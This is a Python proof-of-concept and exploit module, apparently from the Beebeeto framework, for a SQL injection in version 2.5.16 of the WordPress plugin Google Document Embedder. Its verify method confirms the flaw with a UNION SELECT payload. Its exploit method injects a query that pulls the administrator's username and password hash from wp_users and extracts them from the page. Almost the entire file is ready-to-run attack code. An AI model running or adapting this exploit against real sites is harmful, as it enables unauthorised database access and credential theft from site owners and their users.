#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0174',
            'name': 'Wordpress Google Document Embedder 2.5.16 ~view.php SQL Injection POC & Exploit',
            'author': 'Ricter',
            'create_date': '2014-12-05',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Google Document Embedder',
            'vul_version': ['2.5.16'],
            'type': 'SQL Injection',
            'tag': ['Wordpress插件漏洞', 'Google Document Embedder漏洞', '~view.php', 'php'],
            'desc': '漏洞文件：~view.php',
            'references': ['http://www.exploit-db.com/exploits/35447/'],
        },
    }


    @classmethod
    def verify(cls, args):
        url = '%s/wp-content/plugins/google-document-embedder/~view.php' % args['options']['target']
        params = {
            'embedded': 1,
            'gpid': ('0 UNION SELECT 1,2,3,CONCAT(CAST(CHAR(97,58,49,58,123,11'
                '5,58,54,58,34,118,119,95,99,115,115,34,59,115,58)as CHAR),LEN'
                'GTH(md5(1234)),CAST(CHAR(58,34)as CHAR),md5(26443),CAST(CHAR('
                '34,59,125)as CHAR))FROM wp_users WHERE ID=1')
        }
        response = requests.get(url, params=params).content
        if '77596ce7097c5f353cffcc865487d9e2' in response:
            args['success'] = True
            args['poc_ret']['vul_url'] = url
        return args


    @classmethod
    def exploit(cls, args):
        url = '%s/wp-content/plugins/google-document-embedder/~view.php' % args['options']['target']
        params = {
            'embedded': 1,
            'gpid': ('0 UNION SELECT 1,2,3,CONCAT(CAST(CHAR(97,58,49,58,123,11'
                '5,58,54,58,34,118,119,95,99,115,115,34,59,115,58)as CHAR),LEN'
                'GTH(concat(user_login,0x3a,user_pass)),CAST(CHAR(58,34)as CHA'
                'R),concat(user_login,0x3a,user_pass),CAST(CHAR(34,59,125)as C'
                'HAR))FROM wp_users WHERE ID=1')
        }
        response = requests.get(url, params=params).content
        match = re.search(r'type="text/css" href="(?P<Username>.*):(?P<Password>.*)">', response)
        if match:
            args['success'] = True
            args['poc_ret']['vul_url'] = url
            args['poc_ret']['username'] = match.groupdict()['Username']
            args['poc_ret']['password'] = match.groupdict()['Password']
        return args


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())